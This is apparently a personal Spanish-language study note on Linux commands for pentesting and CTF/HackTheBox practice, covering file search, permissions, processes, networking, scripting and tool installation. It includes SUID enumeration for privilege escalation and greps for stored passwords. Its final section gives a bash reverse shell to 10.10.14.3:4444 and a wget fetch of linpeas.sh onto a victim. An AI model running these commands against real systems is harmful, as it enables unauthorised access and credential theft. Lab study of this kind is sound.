---
title: "Linux para Hacking"
type: note
status: active
tags:
  - seguridad
  - linux
  - fundamentos
  - herramientas
aliases:
  - Linux para pentesting
  - Comandos esenciales Linux
created: 2026-06-13
updated: 2026-06-13
---

# Linux para Hacking

> [!INFO] Fuente
> Basado en OverTheWire Bandit, Linux Journey, y experiencia en CTF/HTB.

---

## Navegacion y archivos

```bash
# Busqueda de archivos
find / -name "*.txt" 2>/dev/null
find / -perm -4000 2>/dev/null          # SUID binaries (escalada)
find / -type f -user root -perm -4000 2>/dev/null

# Archivos interesantes
locate config.php
grep -r "password" /var/www/ 2>/dev/null
grep -r "DB_PASSWORD" /etc/ 2>/dev/null

# Wildcards peligrosos
* ? [a-z]  # Pueden ser explotados para escalada
```

---

## Permisos y propietarios

```
-rwxr-xr-x  1 root  root  1024 Jun 1 12:00 script.sh
|  |  |  |
|  |  |  → World (others)
|  |  → Group
|  → User (owner)
→ Tipo (- file, d dir, l symlink, s socket, p pipe)
```

### SUID, SGID, Sticky Bit

```bash
chmod u+s script.sh     # SUID — corre como el owner
chmod g+s directorio    # SGID — nuevos archivos heredan grupo
chmod +t /tmp          # Sticky bit — solo su dueño borra archivos
```

> [!DANGER] SUID es la escalada mas comun
> `find / -perm -4000 2>/dev/null` es lo primero que corre despues de ganar acceso. Binarios SUID inesperados = root facil.

---

## Procesos

```bash
ps aux                  # Todos los procesos
ps aux | grep apache    # Filtrar
top/htop                # Monitoreo interactivo
netstat -tlnp           # Puertos escuchando (obsoleto)
ss -tlnp                # Puertos escuchando (moderno)
lsof -i :80             # Que proceso usa el puerto 80

# Background / Foreground
ctrl+z                  # Suspender proceso
bg                      # Mandar a background
fg                      # Traer a foreground
jobs                    # Listar trabajos
```

---

## Redes

```bash
# Interfaces
ip a                    # Ver interfaces y IPs
ip route                # Tabla de ruteo
ip neigh                # Tabla ARP

# Conexiones
ss -tlnp                # TCP escuchando
ss -ulnp                # UDP escuchando
ss -tup                 # Conexiones establecidas

# Firewall
iptables -L -n          # Reglas de firewall
ufw status              # Uncomplicated Firewall

# /etc/hosts
echo "127.0.0.1 target.com" >> /etc/hosts  # Redireccion local
```

---

## Usuarios y grupos

```bash
whoami                  # Quien sos
id                      # UID, GID, grupos
who                     # Quien esta conectado
w                       # Lo mismo, mas detalle
last                    # Ultimos logins
lastlog                 # Todos los logins registrados

# Cambiar de usuario
su -                    # Switch a root (si sabes la pass)
sudo -l                 # Que comandos podes correr como sudo
sudo -u www-data bash   # Correr como otro usuario

# Archivos clave
cat /etc/passwd         # Usuarios
cat /etc/shadow         # Hashes de passwords (requiere root)
cat /etc/group          # Grupos
cat /etc/sudoers        # Config sudo (requiere root)
```

---

## Scripting basico

```bash
#!/bin/bash

# Loop
for url in $(cat targets.txt); do
    echo "Escaneando: $url"
    ping -c 1 $url
done

# Variables
target=$1
output_dir="recon/$target"
mkdir -p $output_dir

# Condicionales
if [ -f "$output_dir/results.txt" ]; then
    echo "Ya escaneado"
else
    echo "Primer scan"
fi

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color
echo -e "${GREEN}[+] Exito${NC}"
```

---

## Herramientas instalacion (Go)

```bash
# Instalar Go (necesario para ProjectDiscovery tools)
wget https://go.dev/dl/go1.22.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.zshrc
source ~/.zshrc

# Tools de ProjectDiscovery
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest

# Otras tools
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/ffuf/ffuf/v2@latest
```

---

## Configuracion util

```bash
# .zshrc / .bashrc
alias ls='ls -la --color=auto'
alias ll='ls -la'
alias la='ls -A'
alias ip='curl -s ifconfig.me'
alias scan='nmap -sC -sV -p- --min-rate=1000'

# PATH para tools
export PATH=$PATH:$HOME/go/bin
export PATH=$PATH:$HOME/.local/bin

# Editar y recargar
nano ~/.zshrc
source ~/.zshrc
```

---

## Trucos para CTF/HTB

```bash
# Reverse shell clasica
bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'

# Estabilizar shell (CTRL+C no mata la sesion)
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo; fg
export TERM=xterm

# Transferencia de archivos
python3 -m http.server 80   # Servir archivos desde la targeta
wget http://10.10.14.3/linpeas.sh  # Bajar a la victima
```

---

## Ver tambien

- [[SEGURIDAD/Fundamentos Redes]]
- [[SEGURIDAD/HTTP Profundo]]
- [[SEGURIDAD/Roadmap Bug Bounty]]
- [[SEGURIDAD/00 - INDICE]]
